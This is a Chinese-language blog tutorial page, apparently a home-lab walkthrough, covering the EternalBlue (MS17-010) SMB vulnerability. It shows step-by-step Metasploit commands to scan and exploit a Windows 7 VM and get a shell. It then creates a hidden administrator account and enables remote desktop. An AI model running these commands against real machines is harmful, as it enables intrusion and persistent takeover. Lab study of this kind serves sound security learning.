@@ -1,0 +1,464 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <meta name="theme-color" content="#3367D6"/>
+  <link rel="apple-touch-icon" href="/icons-192.png">
+  <link rel="manifest" href="/manifest.json">
+  
+
+
+  <meta name="generator" content="Hexo 6.3.0">
+
+  
+    <meta name="description" content="选择有时候比努力更重要">
+  
+
+  
+
+  
+    <meta name="author" content="深山法海">
+  
+
+  
+
+  
+
+  <title>永恒之蓝 CVE-2017-0143 | 知识加油站</title>
+
+  
+
+  
+    <link rel="shortcut icon" href="/favicon.ico">
+  
+
+  
+
+  
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@1.1.3/index.min.css">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlightjs@9.16.2/styles/monokai.css">
+  
+
+  
+<link rel="stylesheet" href="/css/style.css">
+
+<link rel="alternate" href="/atom.xml" title="知识加油站" type="application/atom+xml">
+</head>
+<body>
+  <div class="root-container">
+    
+<!-- header container -->
+<header class="header-container post">
+  
+    <div class="post-image" style="background-image: url(https://img0.baidu.com/it/u=4239437177,2248583796&amp;fm=253&amp;fmt=auto&amp;app=138&amp;f=JPEG?w=500&amp;h=281)"></div>
+  
+
+  <!-- navbar -->
+<nav class="navbar">
+  <div class="navbar-content">
+    <!-- logo -->
+    <div class="navbar-logo">
+      <a href="/">
+        
+          知识加油站
+        
+      </a>
+    </div>
+    <!-- link -->
+    <div class="navbar-link">
+      <div class="navbar-btn">
+        <div></div>
+        <div></div>
+        <div></div>
+      </div>
+      <ul class="navbar-list">
+        
+          <li class="navbar-list-item"><a href="/">首页</a></li>
+        
+          <li class="navbar-list-item"><a href="/links">友链</a></li>
+        
+          <li class="navbar-list-item"><a href="/about">关于</a></li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+  
+
+  
+  
+
+  
+  
+
+  
+  
+
+  
+  
+    <div class="header-content">
+      <div class="post-text layout-block">
+        <div class="layout-margin">
+          <h1 class="title-wrap">永恒之蓝 CVE-2017-0143</h1>
+          <h2 class="title-sub-wrap">
+            <strong>深山法海</strong>
+            <span>发布于</span>
+            <time  class="article-date" datetime="2023-05-11T05:25:37.000Z" itemprop="datePublished">2023-05-11</time>
+          </h2>
+          
+            <h2 class="title-sub-wrap new-date">
+              <span>最后更新于</span>
+              <time  class="article-updated" datetime="2023-05-19T06:29:52.867Z" itemprop="dateUpdated">2023-05-19</time>
+            </h2>
+          
+          
+          <ul class="wrap-list dark">
+  
+</ul>
+          <ul class="wrap-list dark">
+  
+</ul>
+        </div>
+      </div>
+    </div>
+  
+
+  
+  
+  
+</header>
+
+    <!-- 文章 -->
+
+<!-- 文章内容 -->
+<div class="body-container">
+  <article class="content-container layout-block post-container">
+    <div class="article-info">
+      
+      
+      
+      
+      <section class="article-entry markdown-body layout-margin content-padding--large soft-size--large soft-style--box">
+        <h1 id="永恒之蓝"><a href="#永恒之蓝" class="headerlink" title="永恒之蓝"></a>永恒之蓝</h1><h3 id="一、什么是永恒之蓝"><a href="#一、什么是永恒之蓝" class="headerlink" title="一、什么是永恒之蓝"></a>一、什么是永恒之蓝</h3><p>永恒之蓝（Eternal Blue）爆发于2017年4月14日晚，是一种利用Windows系统的SMB协议漏洞来获取系统的最高权限，以此来控制被入侵的计算机。甚至于2017年5月12日， 不法分子通过改造“永恒之蓝”制作了wannacry勒索病毒，使全世界大范围内遭受了该勒索病毒，甚至波及到学校、大型企业、政府等机构，只能通过支付高额的赎金才能恢复出文件。不过在该病毒出来不久就被微软通过打补丁修复。</p>
+<h3 id="二、什么是SMB协议"><a href="#二、什么是SMB协议" class="headerlink" title="二、什么是SMB协议"></a>二、什么是SMB协议</h3><p>SMB（Server Message Block）通信协议是微软（Microsoft）和英特尔(Intel)在1987年制定的协议，主要是作为Microsoft网络的通讯协议。SMB 是在会话层（session layer）和表示层（presentation layer）以及小部分应用层（application layer）的协议。通过SMB协议可以在计算机间共享文件、打印机、命名管道等资源，电脑上的网上邻居就是靠SMB实现的；SMB协议工作在应用层和会话层，可以用在TCP&#x2F;IP协议之上，SMB使用TCP139端口和TCP445端口。</p>
+<h3 id="三、漏洞描述"><a href="#三、漏洞描述" class="headerlink" title="三、漏洞描述"></a>三、漏洞描述</h3><p>永恒之蓝 主要就是通过TCP端口（445）和139 来利用SMBv1和NBT中的远程代码执行漏洞，恶意代码会扫描开放445文件共享端口的windows 机器，无需用户任何操作，只要开机上网，不法分子就能在电脑和服务器里进行一系列的危险操作。如远程控制木马，获取最高权限等。</p>
+<h3 id="四、影响范围"><a href="#四、影响范围" class="headerlink" title="四、影响范围"></a>四、影响范围</h3><p>windows xp 2003 2008 7 8 等受影响</p>
+<h3 id="五、准备工具"><a href="#五、准备工具" class="headerlink" title="五、准备工具"></a>五、准备工具</h3><p>vm虚拟机软件</p>
+<p>网络模式：NAT</p>
+<p>攻击机：kali系统2023.1（192.168.170.128）</p>
+<p>靶机：	windows7系统专业版（开启了445端口，并且防火墙关闭）（192.168.170.142）</p>
+<h3 id="六、漏洞利用"><a href="#六、漏洞利用" class="headerlink" title="六、漏洞利用"></a>六、漏洞利用</h3><h4 id="1-nmap扫描靶机"><a href="#1-nmap扫描靶机" class="headerlink" title="1 nmap扫描靶机"></a>1 nmap扫描靶机</h4><p>登录kali，win7系统，利用kali使用nmap扫描探测本网段存活的主机</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap 192.168.170.1/24</span><br></pre></td></tr></table></figure>
+
+<p><img src="/./../images/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D-ms17-010/image-20230519083902044.png" alt="image-20230519083902044"></p>
+<p>发现我们的靶机开启了很多端口，我们需要找到的就是 <code>445</code> 端口。</p>
+<p>445端口是一种TCP端口，该端口在windows 2000 Server或Windows Server 2003系统中发挥的作用与139端口是完全相同的。 具体地说，它可以提供局域网中文件或打印机共享服务。</p>
+<h4 id="2-使用Metasploit监听目标"><a href="#2-使用Metasploit监听目标" class="headerlink" title="2 使用Metasploit监听目标"></a>2 使用Metasploit监听目标</h4><p>输入如下命令启动Metasploit</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure>
+
+<p><img src="/./../images/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D-ms17-010/image-20230518152450860.png" alt="image-20230518152450860"></p>
+<h4 id="3-攻击流程"><a href="#3-攻击流程" class="headerlink" title="3 攻击流程"></a>3 攻击流程</h4><p>进入后查找找永恒之蓝漏洞</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search ms17-010</span><br></pre></td></tr></table></figure>
+
+<p><img src="/./../images/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D-ms17-010/image-20230518162234825.png" alt="image-20230518162234825"></p>
+<blockquote>
+<p>0   exploit&#x2F;windows&#x2F;smb&#x2F;ms17_010_eternalblue：用于利用EternalBlue漏洞实现SMB远程代码执行。</p>
+<p>1   exploit&#x2F;windows&#x2F;smb&#x2F;ms17_010_psexec：用于利用EternalRomance、EternalSynergy或EternalChampion漏洞实现SMB远程代码执行。</p>
+<p>2   auxiliary&#x2F;admin&#x2F;smb&#x2F;ms17_010_command：用于利用EternalRomance、EternalSynergy或EternalChampion漏洞实现SMB远程命令执行。</p>
+<p>3   auxiliary&#x2F;scanner&#x2F;smb&#x2F;smb_ms17_010：用于检测目标是否存在MS17-010漏洞。</p>
+<p>4   exploit&#x2F;windows&#x2F;smb&#x2F;smb_doublepulsar_rce：用于利用DoublePulsar漏洞实现SMB远程代码执行。</p>
+</blockquote>
+<p>选择检测模块</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use 3</span><br></pre></td></tr></table></figure>
+
+<p>查看模块信息</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">info</span><br></pre></td></tr></table></figure>
+
+<p>查看需要修改的选项</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show options</span><br></pre></td></tr></table></figure>
+
+<p>设置攻击目标</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set rhosts 192.168.170.142</span><br></pre></td></tr></table></figure>
+
+<p><img src="/./../images/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D-ms17-010/image-20230519084326942.png" alt="image-20230519084326942"></p>
+<p>执行模块攻击检测</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p><img src="/./../images/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D-ms17-010/image-20230519084303566.png" alt="image-20230519084303566">前面为 <code>+</code> 号，表示可以攻击。</p>
+<p>接下来的步骤就开始攻击</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">back					   #退出模块</span><br><span class="line">search ms17-010				#查找漏洞</span><br><span class="line">use 0					   #选择攻击模块</span><br><span class="line">set rhosts 192.168.170.142	 #设置攻击目标</span><br><span class="line">run						   #攻击</span><br></pre></td></tr></table></figure>
+
+<p><img src="/./../images/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D-ms17-010/image-20230519090115579.png" alt="image-20230519090115579"></p>
+<blockquote>
+<p>成功 上图就是成功打进了</p>
+<p>报错:漏洞利用因失败而中止（可能原因是win7版本的问题）</p>
+</blockquote>
+<h4 id="4-得到靶机shell"><a href="#4-得到靶机shell" class="headerlink" title="4 得到靶机shell"></a>4 得到靶机shell</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell</span><br></pre></td></tr></table></figure>
+
+<p><img src="/./../images/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D-ms17-010/image-20230519090824111.png" alt="image-20230519090824111"></p>
+<p>接下来就是搞事情了</p>
+<p><img src="/./../images/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D-ms17-010/image-20230519091036102.png" alt="image-20230519091036102"></p>
+<p>由于有乱码，我们需要输入如下代码即可恢复</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chcp 65001</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="5-通过shell对靶机进行控制"><a href="#5-通过shell对靶机进行控制" class="headerlink" title="5 通过shell对靶机进行控制"></a>5 通过shell对靶机进行控制</h4><h5 id="1-创建新用户"><a href="#1-创建新用户" class="headerlink" title="(1) 创建新用户"></a>(1) 创建新用户</h5><p>语法：net user 用户名 密码 &#x2F;add</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user yhzl 123456 /add</span><br></pre></td></tr></table></figure>
+
+<p><img src="/./../images/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D-ms17-010/image-20230519092038840.png" alt="image-20230519092038840"></p>
+<p>查看用户信息</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user</span><br></pre></td></tr></table></figure>
+
+<p><img src="/./../images/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D-ms17-010/image-20230519092348625.png" alt="image-20230519092348625"></p>
+<h5 id="2-将用户添加至管理员组"><a href="#2-将用户添加至管理员组" class="headerlink" title="(2)将用户添加至管理员组"></a>(2)将用户添加至管理员组</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net localgroup administrators yhzl /add</span><br></pre></td></tr></table></figure>
+
+<p><img src="/./../images/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D-ms17-010/image-20230519093534270.png" alt="image-20230519093534270"></p>
+<h5 id="3-开启远程桌面功能"><a href="#3-开启远程桌面功能" class="headerlink" title="(3) 开启远程桌面功能"></a>(3) 开启远程桌面功能</h5><p>查看3389端口状态</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -ano</span><br></pre></td></tr></table></figure>
+
+<p>看到3389端口并没有开启，开启3389端口</p>
+<p>方法一</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</span><br></pre></td></tr></table></figure>
+
+<p><img src="/./../images/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D-ms17-010/image-20230519094005308.png" alt="image-20230519094005308"></p>
+<p>方法二</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic RDTOGGLE WHERE ServerName=&#x27;%COMPUTERNAME%&#x27; call SetAllowTSConnections 1</span><br></pre></td></tr></table></figure>
+
+
+
+<h5 id="4-远程桌面连接靶机"><a href="#4-远程桌面连接靶机" class="headerlink" title="(4) 远程桌面连接靶机"></a>(4) 远程桌面连接靶机</h5><p>添加好之后，就可以用工具去连了，这里我目前知道的 kali 自带工具有 xfreerdp，这是公司的大佬介绍给我用的，还有一个是我自己找的，叫做：rdesktop。</p>
+<p>现在分别讲讲各自的用法吧：</p>
+<p><strong>xfreerdp 工具</strong><br>首先是 xfreerdp 的，命令格式如下：</p>
+<p>很容易理解，&#x2F;u 就是用户名，&#x2F;p 是密码，&#x2F;v 是靶机（目标）的地址 &#x2F;size 就是图形化界面的大小而已。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xfreerdp /u:hack /p:123123 /v:192.168.170.142 /size:80%</span><br></pre></td></tr></table></figure>
+
+<p><strong>5.2、xfreerdp 工具</strong></p>
+<p>然后是 rdesktop，命令格式：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rdesktop 192.168.170.142:3389</span><br></pre></td></tr></table></figure>
+
+<p><img src="/./../images/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D-ms17-010/image-20230519095116540.png" alt="image-20230519095116540"></p>
+<p>连进来，为所欲为了，纯鼠标无脑操作，比命令行操作方便简单，到此结束。</p>
+<p>上面这是一个简单的演示，告诉大家这个漏洞很危险，真正的攻击能做的事情更多。</p>
+<p>注意：我们要做一个遵纪守法的白帽子。</p>
+<p>ssh-keygen –t rsa –C “<a href="mailto:&#108;&#99;&#x73;&#108;&#x6c;&#105;&#106;&#49;&#50;&#x33;&#x40;&#103;&#109;&#97;&#105;&#x6c;&#46;&#x63;&#111;&#x6d;">&#108;&#99;&#x73;&#108;&#x6c;&#105;&#106;&#49;&#50;&#x33;&#x40;&#103;&#109;&#97;&#105;&#x6c;&#46;&#x63;&#111;&#x6d;</a>“</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
+
+      </section>
+
+      
+      
+        <nav class="article-nav">
+          
+            <div class="article-nav-item layout-padding">
+  <article class="card-container article-nav-card content-padding--primary soft-size--large soft-style--box">
+    
+    <div class="card-text">
+      
+        <a href="/2023/05/12/Vulnhub%E7%B3%BB%E5%88%97-DC3%E9%9D%B6%E5%9C%BA/" itemprop="url">
+          <h2 class="card-text--title text-ellipsis">Vulnhub系列-DC3靶场</h2>
+        </a>
+      
+      <div class="card-text--row">Newer</div>
+    </div>
+  </article>
+</div>
+          
+          
+            <div class="article-nav-item layout-padding">
+  <article class="card-container article-nav-card content-padding--primary soft-size--large soft-style--box">
+    
+    <div class="card-text">
+      
+        <a href="/2023/05/11/Vulnhub%E7%B3%BB%E5%88%97-DC2%E9%9D%B6%E5%9C%BA/" itemprop="url">
+          <h2 class="card-text--title text-ellipsis">Vulnhub系列-DC2靶场</h2>
+        </a>
+      
+      <div class="card-text--row">Older</div>
+    </div>
+  </article>
+</div>
+          
+        </nav>
+      
+
+      <section class="page-message-container layout-padding">
+        
+
+
+  
+  
+
+  
+  
+
+
+      </section>
+    </div>
+    <div class="widget-info">
+      <section class="widget-author widget-item layout-margin content-padding--primary soft-size--large soft-style--box">
+  <div class="widget-body">
+    
+      <img src="https://img0.baidu.com/it/u=1427628541,2007968695&amp;fm=253&amp;fmt=auto&amp;app=138&amp;f=JPEG?w=460&amp;h=460" class="soft-size--round soft-style--box" alt="shenshanfahai">
+    
+    
+      <h2>shenshanfahai</h2>
+    
+    
+      <p>贵在坚持</p>
+    
+
+    <div class="count-box">
+      <div class="count-box--item">
+        <svg class="icon icon-article" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path d="M240.51564747 647.74217627h196.07203239c16.59071043 0 30.16492806-13.57421762 30.16492805-30.16492806V165.10332731c0-33.18142087-30.16492806-60.32985613-60.32985612-60.32985611H245.04038668C225.43318342 104.7734712 210.35071939 119.85593522 210.35071939 139.46313845V617.57724821c0 16.59071043 13.57421762 30.16492806 30.16492808 30.16492806z m663.62841731-452.47392089v482.63884894c0 33.18142087-27.14843525 60.32985613-60.32985612 60.32985613H180.18579134c-33.18142087 0-60.32985613-27.14843525-60.32985612-60.32985613V195.26825538c-49.77213131 0-90.49478418 40.72265287-90.49478417 90.49478417v452.4739209c0 49.77213131 40.72265287 90.49478418 90.49478417 90.49478417h286.56681657c16.59071043 0 30.16492806 13.57421762 30.16492807 30.16492807s13.57421762 30.16492806 30.16492805 30.16492806h90.49478418c16.59071043 0 30.16492806-13.57421762 30.16492805-30.16492806s13.57421762-30.16492806 30.16492807-30.16492807h286.56681657c49.77213131 0 90.49478418-40.72265287 90.49478417-90.49478417V285.76303955c0-49.77213131-40.72265287-90.49478418-90.49478417-90.49478417zM587.41232014 647.74217627h191.54729318c19.60720323 0 34.68966726-15.08246403 34.68966729-34.68966727V134.93839925c0-16.59071043-13.57421762-30.16492806-30.16492808-30.16492805H617.57724821c-30.16492806 0-60.32985613 27.14843525-60.32985612 60.32985611v452.4739209c0 16.59071043 13.57421762 30.16492806 30.16492805 30.16492806z" fill="currentColor"></path>
+</svg>
+        <span>6</span>
+      </div>
+      <div class="count-box--item">
+        <svg class="icon icon-categories" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path d="M900.3614811 257.09082106h-339.81629553l-67.96326003-101.9448889c-19.41807444-29.12711113-48.54518557-43.69066667-82.52681443-43.69066667H123.6385189c-53.39970333 0-97.09036999 43.69066667-97.09037113 97.09036999v582.54222222c0 53.39970333 43.69066667 97.09036999 97.09037113 97.09037002h776.7229622c53.39970333 0 97.09036999-43.69066667 97.09037113-97.09037002V354.18119104c0-53.39970333-43.69066667-97.09036999-97.09037113-97.09036998z m-97.09036999 242.72592554H220.72888889c-24.27259221 0-48.54518557-24.27259221-48.54518556-48.54518556s24.27259221-48.54518557 48.54518556-48.54518444h582.54222222c24.27259221 0 48.54518557 24.27259221 48.54518556 48.54518444s-24.27259221 48.54518557-48.54518556 48.54518556z" fill="currentColor"></path>
+</svg>
+        0
+      </div>
+      <div class="count-box--item">
+        <svg class="icon icon-tags" viewBox="0 0 1098 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path d="M283.42180005 272q0-28.38857157-20.09142843-48.48000001t-48.47999998-20.09142842-48.48000002 20.09142842-20.09142846 48.48000001 20.09142846 48.48 48.48000002 20.09142843 48.47999998-20.09142843 20.09142843-48.48zM855.0332285 580.57142843q0 28.38857157-19.81714313 48.2057147l-263.03999997 263.58857157q-20.9142853 19.81714313-48.75428534 19.81714312-28.38857157 0-48.20571468-19.81714312l-383.04-383.58857157q-20.36571468-19.81714313-34.55999999-54.10285688t-14.19428534-62.6742853l0-222.85714313q0-27.84000002 20.36571469-48.20571469t48.2057147-20.36571466l222.85714313 0q28.38857157 0 62.6742853 14.19428529t54.65142842 34.55999999l383.04000001 382.49142843q19.81714313 20.9142853 19.81714314 48.75428532zM1060.74751475 580.57142843q0 28.38857157-19.81714313 48.2057147l-263.04 263.58857157q-20.9142853 19.81714313-48.75428531 19.81714312-19.26857155 0-31.61142843-7.47428531t-28.38857159-24.13714314l251.79428534-251.7942853q19.81714313-19.81714313 19.81714308-48.20571469 0-27.84000002-19.81714308-48.75428531l-383.04000001-382.49142845q-20.36571468-20.36571468-54.65142842-34.55999999t-62.67428532-14.19428534l120 0q28.38857157 0 62.67428532 14.19428534t54.65142842 34.55999999l383.03999998 382.49142845q19.81714313 20.9142853 19.81714314 48.75428531z" fill="currentColor"></path>
+</svg>
+        0
+      </div>
+    </div>
+  </div>
+</section>
+
+      
+
+      
+<section class="widet-notice widget-item layout-margin content-padding--primary soft-size--large soft-style--box">
+  <div class="widget-title">
+    <svg class="icon icon-notice" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path d="M512 945.02305225v28.15620663a24.27259221 24.27259221 0 0 1-24.27259221 24.27259335H394.0352a48.54518557 48.54518557 0 0 1-41.74885888-23.78714112l-110.68302222-184.47170332a132.04290333 132.04290333 0 0 1-17.47626667-48.54518557h118.4502511a200.97706667 200.97706667 0 0 1 76.21594113 14.56355556l20.38897777 133.49925888a48.54518557 48.54518557 0 0 0 36.40888888 27.67075555l16.01991111 2.91271112a24.27259221 24.27259221 0 0 1 20.38897778 25.72894889zM997.45185223 463.45481443a194.18074112 194.18074112 0 0 1-38.8361489 116.50844445 24.75804445 24.75804445 0 0 1-36.4088889 0l-34.95253333-34.95253333a24.27259221 24.27259221 0 0 1-2.91271111-30.58346667 97.09036999 97.09036999 0 0 0 0-106.79940665 24.27259221 24.27259221 0 0 1 2.91271111-30.58346666l34.95253333-34.95253334a24.75804445 24.75804445 0 0 1 18.93262223-7.28177777 26.2144 26.2144 0 0 1 17.47626667 9.70903665A194.18074112 194.18074112 0 0 1 997.45185223 463.45481443z m-194.18074112-388.36148111v776.72296335a48.54518557 48.54518557 0 0 1-48.54518556 48.54518443h-28.64165888a48.54518557 48.54518557 0 0 1-33.98163001-14.07810332l-145.63555556-143.20829668A291.27111111 291.27111111 0 0 0 342.57730333 657.63555556H172.18370333a145.63555556 145.63555556 0 0 1-145.63555556-145.63555556v-97.09036999a145.63555556 145.63555556 0 0 1 145.63555556-145.63555556h170.3936a291.27111111 291.27111111 0 0 0 206.31703779-85.43952668l145.63555555-143.20829554a48.54518557 48.54518557 0 0 1 33.98162888-14.07810446H754.72592555a48.54518557 48.54518557 0 0 1 48.54518556 48.54518555z" fill="currentColor"></path>
+</svg>
+    <span>NOTICE</span>
+  </div>
+  <div class="widget-body">
+    <p>flex-block主题部分重构，详情查看https://github.com/miiiku/flex-block</p>
+  </div>
+</section>
+
+
+      <section class="widget-categorys widget-item layout-margin content-padding--primary soft-size--large soft-style--box">
+  <div class="widget-title">
+    <svg class="icon icon-categories" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path d="M900.3614811 257.09082106h-339.81629553l-67.96326003-101.9448889c-19.41807444-29.12711113-48.54518557-43.69066667-82.52681443-43.69066667H123.6385189c-53.39970333 0-97.09036999 43.69066667-97.09037113 97.09036999v582.54222222c0 53.39970333 43.69066667 97.09036999 97.09037113 97.09037002h776.7229622c53.39970333 0 97.09036999-43.69066667 97.09037113-97.09037002V354.18119104c0-53.39970333-43.69066667-97.09036999-97.09037113-97.09036998z m-97.09036999 242.72592554H220.72888889c-24.27259221 0-48.54518557-24.27259221-48.54518556-48.54518556s24.27259221-48.54518557 48.54518556-48.54518444h582.54222222c24.27259221 0 48.54518557 24.27259221 48.54518556 48.54518444s-24.27259221 48.54518557-48.54518556 48.54518556z" fill="currentColor"></path>
+</svg>
+    <span>CATEGORYS</span>
+  </div>
+  <div class="widget-body">
+    <ul class="categorys-list">
+      
+    </ul>
+  </div>
+</section>
+
+      <section class="widget-tags widget-item  layout-margin content-padding--primary soft-size--large soft-style--box">
+  <div class="widget-title">
+    <svg class="icon icon-tags" viewBox="0 0 1098 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path d="M283.42180005 272q0-28.38857157-20.09142843-48.48000001t-48.47999998-20.09142842-48.48000002 20.09142842-20.09142846 48.48000001 20.09142846 48.48 48.48000002 20.09142843 48.47999998-20.09142843 20.09142843-48.48zM855.0332285 580.57142843q0 28.38857157-19.81714313 48.2057147l-263.03999997 263.58857157q-20.9142853 19.81714313-48.75428534 19.81714312-28.38857157 0-48.20571468-19.81714312l-383.04-383.58857157q-20.36571468-19.81714313-34.55999999-54.10285688t-14.19428534-62.6742853l0-222.85714313q0-27.84000002 20.36571469-48.20571469t48.2057147-20.36571466l222.85714313 0q28.38857157 0 62.6742853 14.19428529t54.65142842 34.55999999l383.04000001 382.49142843q19.81714313 20.9142853 19.81714314 48.75428532zM1060.74751475 580.57142843q0 28.38857157-19.81714313 48.2057147l-263.04 263.58857157q-20.9142853 19.81714313-48.75428531 19.81714312-19.26857155 0-31.61142843-7.47428531t-28.38857159-24.13714314l251.79428534-251.7942853q19.81714313-19.81714313 19.81714308-48.20571469 0-27.84000002-19.81714308-48.75428531l-383.04000001-382.49142845q-20.36571468-20.36571468-54.65142842-34.55999999t-62.67428532-14.19428534l120 0q28.38857157 0 62.67428532 14.19428534t54.65142842 34.55999999l383.03999998 382.49142845q19.81714313 20.9142853 19.81714314 48.75428531z" fill="currentColor"></path>
+</svg>
+    <span>TAGS</span>
+  </div>
+  <div class="widget-body">
+    <div class="tags-cloud">
+      
+    </div>
+  </div>
+</section>
+    </div>
+  </article>
+</div>
+
+    <!-- footer container -->
+<footer id="footer" class="footer">
+  <div class="footer-container">
+    
+    <div class="social-icons">
+      
+        
+      
+        
+      
+        
+      
+        
+          <a href="https://github.com/miiiku/" class="soft-size--primary soft-style--box" target="_blank" rel="noopener noreferrer">
+            <svg class="icon icon-github" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path d="M64.6 512c0 195.6 125.4 361.9 300.1 422.9 23.5 5.9 19.9-10.8 19.9-22.2v-77.6c-135.8 15.9-141.3-74-150.5-89-18.5-31.5-61.9-39.5-49-54.5 31-15.9 62.5 4 98.9 58 26.4 39.1 77.9 32.5 104.1 26 5.7-23.5 17.9-44.5 34.7-60.9-140.7-25.2-199.4-111.1-199.4-213.3 0-49.5 16.4-95.1 48.4-131.8-20.4-60.6 1.9-112.4 4.9-120.1 58.2-5.2 118.5 41.6 123.3 45.3 33.1-8.9 70.8-13.7 112.9-13.7 42.4 0 80.3 4.9 113.5 13.9 11.3-8.6 67.3-48.8 121.4-43.9 2.9 7.7 24.7 58.3 5.5 118.1 32.5 36.8 49 82.8 49 132.4 0 102.3-59 188.3-200.2 213.2 23.5 23.3 38.1 55.5 38.1 91.1v112.7c0.8 9 0 17.9 15.1 17.9C832.7 877 960.4 709.4 960.4 512.1c0-247.5-200.6-447.9-447.9-447.9C265 64.1 64.6 264.5 64.6 512z"></path>
+</svg>
+          </a>
+        
+      
+        
+          <a href="https://twitter.com/guanquanhong" class="soft-size--primary soft-style--box" target="_blank" rel="noopener noreferrer">
+            <svg class="icon icon-twitter" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path d="M962.285714 233.142857q-38.285714 56-92.571429 95.428571 0.571429 8 0.571429 24 0 74.285714-21.714286 148.285714t-66 142-105.428571 120.285714-147.428571 83.428571-184.571429 31.142857q-154.857143 0-283.428571-82.857143 20 2.285714 44.571429 2.285714 128.571429 0 229.142857-78.857143-60-1.142857-107.428571-36.857143t-65.142857-91.142857q18.857143 2.857143 34.857143 2.857143 24.571429 0 48.571429-6.285714-64-13.142857-106-63.714286t-42-117.428571l0-2.285714q38.857143 21.714286 83.428571 23.428571-37.714286-25.142857-60-65.714286t-22.285714-88q0-50.285714 25.142857-93.142857 69.142857 85.142857 168.285714 136.285714t212.285714 56.857143q-4.571429-21.714286-4.571429-42.285714 0-76.571429 54-130.571429t130.571429-54q80 0 134.857143 58.285714 62.285714-12 117.142857-44.571429-21.142857 65.714286-81.142857 101.714286 53.142857-5.714286 106.285714-28.571429z"></path>
+</svg>
+          </a>
+        
+      
+    </div>
+     
+    <p>&copy; 2023 <a href="/" target="_blank">深山法海</a></p>
+
+    
+
+    <p>Powered by <a href="https://hexo.io" target="_blank" rel="noopener noreferrer">Hexo</a> Theme - <a href="https://github.com/miiiku/flex-block" target="_blank" rel="noopener noreferrer author">flex-block</a></p>
+
+    <p>
+      <a href="javascript:;" id="theme-light">🌞 浅色</a>
+      <a href="javascript:;" id="theme-dark">🌛 深色</a>
+      <a href="javascript:;" id="theme-auto">🤖️ 自动</a>
+    </p>
+  </div>
+</footer>
+  </div>
+
+  <div class="back-to-top-fixed soft-size--round soft-style--box">
